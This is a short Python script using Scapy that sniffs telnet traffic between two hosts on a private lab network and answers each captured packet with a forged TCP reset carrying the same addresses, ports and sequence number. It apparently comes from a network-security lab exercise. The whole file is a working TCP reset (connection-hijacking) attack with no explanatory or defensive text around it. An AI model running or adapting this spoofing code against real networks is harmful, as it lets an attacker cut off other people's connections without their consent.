#!/usr/bin/python3
from scapy.all import *


def spoof(pkt):
    old_tcp = pkt[TCP]
    old_ip = pkt[IP]

    ip = IP(src=old_ip.src, dst=old_ip.dst)
    tcp = TCP(sport=old_tcp.sport,
              dport=old_tcp.dport,
              seq=old_tcp.seq,
              flags="R")

    pkt = ip / tcp
    send(pkt, verbose=0)
    print("Spoofed Packet: {} --> {}".format(ip.src, ip.dst))
    ls(pkt)


f = "tcp and src host 10.9.0.6 and dst host 10.9.0.5 and dst port 23"
sniff(iface="br-48fe231f7c9a", filter=f, prn=spoof, count=10)
